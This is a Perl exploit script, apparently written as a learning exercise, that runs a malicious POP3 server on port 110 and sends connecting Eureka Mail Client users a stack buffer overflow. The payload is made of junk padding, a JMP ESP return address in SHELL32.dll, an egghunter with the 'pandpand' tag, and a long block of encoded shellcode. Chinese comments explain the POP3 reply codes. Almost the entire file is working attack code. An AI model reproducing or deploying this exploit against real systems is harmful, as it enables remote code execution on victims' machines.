use Socket;

#Log data, 条目 109
#地址=7DCFD8E4
#消息=Found  JMP ESP at 0x7dcfd8e4     Module:  C:\WINDOWS\system32\SHELL32.dll

    my $junk="\x41" x 709;
    my $ret = pack('V',0x7DCFD8E4); #jump to ESP - run  !pvefindaddr j -r ESP -n  to find an address
    
    my $egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A".
    "\x02".
    "\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
    "\x70\x61\x6e\x64".
    "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7");
    my $padding = "\x42"x 1000;

my $shellcode = (
"\x89\xe6\xdb\xd8\xd9\x76\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51" .
"\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32" .
"\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41" .
"\x42\x75\x4a\x49\x49\x6c\x4b\x58\x4e\x69\x45\x50\x43\x30" .
"\x47\x70\x43\x50\x4c\x49\x5a\x45\x50\x31\x4e\x32\x50\x64" .
"\x4e\x6b\x51\x42\x50\x30\x4e\x6b\x50\x52\x56\x6c\x4c\x4b" .
"\x51\x42\x45\x44\x4c\x4b\x54\x32\x51\x38\x54\x4f\x4f\x47" .
"\x50\x4a\x56\x46\x50\x31\x4b\x4f\x56\x51\x49\x50\x4e\x4c" .
"\x47\x4c\x45\x31\x43\x4c\x54\x42\x56\x4c\x51\x30\x49\x51" .
"\x5a\x6f\x56\x6d\x47\x71\x4b\x77\x58\x62\x58\x70\x52\x72" .
"\x52\x77\x4e\x6b\x51\x42\x54\x50\x4c\x4b\x50\x42\x45\x6c" .
"\x47\x71\x5a\x70\x4e\x6b\x51\x50\x52\x58\x4b\x35\x4f\x30" .
"\x51\x64\x51\x5a\x56\x61\x58\x50\x50\x50\x4e\x6b\x50\x48" .
"\x52\x38\x4e\x6b\x50\x58\x45\x70\x56\x61\x58\x53\x4b\x53" .
"\x47\x4c\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x56\x61\x4e\x36" .
"\x45\x61\x4b\x4f\x56\x51\x4b\x70\x4c\x6c\x4b\x71\x58\x4f" .
"\x54\x4d\x47\x71\x5a\x67\x47\x48\x4d\x30\x43\x45\x5a\x54" .
"\x47\x73\x51\x6d\x4b\x48\x45\x6b\x43\x4d\x54\x64\x43\x45" .
"\x5a\x42\x51\x48\x4e\x6b\x43\x68\x47\x54\x43\x31\x49\x43" .
"\x51\x76\x4e\x6b\x54\x4c\x52\x6b\x4c\x4b\x52\x78\x47\x6c" .
"\x43\x31\x4e\x33\x4c\x4b\x56\x64\x4c\x4b\x43\x31\x4e\x30" .
"\x4e\x69\x47\x34\x51\x34\x51\x34\x51\x4b\x51\x4b\x43\x51" .
"\x52\x79\x51\x4a\x50\x51\x4b\x4f\x4d\x30\x51\x48\x51\x4f" .
"\x52\x7a\x4c\x4b\x45\x42\x58\x6b\x4b\x36\x43\x6d\x45\x38" .
"\x47\x43\x54\x72\x47\x70\x47\x70\x45\x38\x50\x77\x54\x33" .
"\x45\x62\x51\x4f\x43\x64\x51\x78\x50\x4c\x52\x57\x45\x76" .
"\x54\x47\x49\x6f\x4b\x65\x58\x38\x4c\x50\x43\x31\x45\x50" .
"\x45\x50\x47\x59\x58\x44\x56\x34\x50\x50\x51\x78\x54\x69" .
"\x4f\x70\x50\x6b\x45\x50\x49\x6f\x4b\x65\x52\x70\x50\x50" .
"\x52\x70\x52\x70\x51\x50\x52\x70\x43\x70\x52\x70\x45\x38" .
"\x49\x7a\x56\x6f\x49\x4f\x4d\x30\x4b\x4f\x49\x45\x5a\x37" .
"\x43\x5a\x47\x75\x50\x68\x49\x50\x49\x38\x49\x56\x4c\x47" .
"\x45\x38\x45\x52\x45\x50\x56\x71\x51\x4c\x4d\x59\x4d\x36" .
"\x43\x5a\x56\x70\x50\x56\x52\x77\x52\x48\x4d\x49\x4e\x45" .
"\x52\x54\x43\x51\x4b\x4f\x4b\x65\x4d\x55\x49\x50\x51\x64" .
"\x54\x4c\x4b\x4f\x50\x4e\x56\x68\x52\x55\x5a\x4c\x51\x78" .
"\x4c\x30\x4f\x45\x4e\x42\x43\x66\x4b\x4f\x58\x55\x52\x4a" .
"\x43\x30\x50\x6a\x43\x34\x52\x76\x56\x37\x45\x38\x43\x32" .
"\x49\x49\x49\x58\x51\x4f\x4b\x4f\x5a\x75\x4e\x6b\x54\x76" .
"\x52\x4a\x47\x30\x43\x58\x47\x70\x54\x50\x47\x70\x45\x50" .
"\x51\x46\x50\x6a\x43\x30\x45\x38\x56\x38\x4e\x44\x52\x73" .
"\x4b\x55\x49\x6f\x49\x45\x4f\x63\x43\x63\x51\x7a\x45\x50" .
"\x52\x76\x50\x53\x43\x67\x43\x58\x43\x32\x5a\x79\x49\x58" .
"\x43\x6f\x4b\x4f\x58\x55\x45\x51\x58\x43\x51\x39\x49\x56" .
"\x4f\x75\x4b\x46\x51\x65\x58\x6c\x5a\x63\x41\x41");
    my $payload=$junk.$ret.$egghunter.$padding."pandpand".$shellcode;


my $port = 110;
my $proto = getprotobyname('tcp');
socket(SERVER,PF_INET,SOCK_STREAM,$proto);
my $paddr = sockaddr_in($port,INADDR_ANY);
bind(SERVER,$paddr);
listen(SERVER,SOMAXCONN);
print "[+] Listenning on tcp port 110 [POP3]... \n";
print "Configure Eureka Mail Client to connect to this host\n";
my $client_addr;
if ($client_addr = accept(CLIENT,SERVER)) 
{
	print "[+] Client Connected.\n";
	while (1) {
#POP服务器使用应答对此回应，“+OK”表示命令成功，"-ERR"表示命令失败，后面是简单的文字说明，
#例如"+OK Password required for Bob" 表示USER命令成功执行，需要客户输入密码进行认证
		print CLIENT "-ERR".$payload."\n";
		print "    ->Sent ".length($payload)." bytes\n";
	}
}
close CLIENT;
print "Connection closed\n";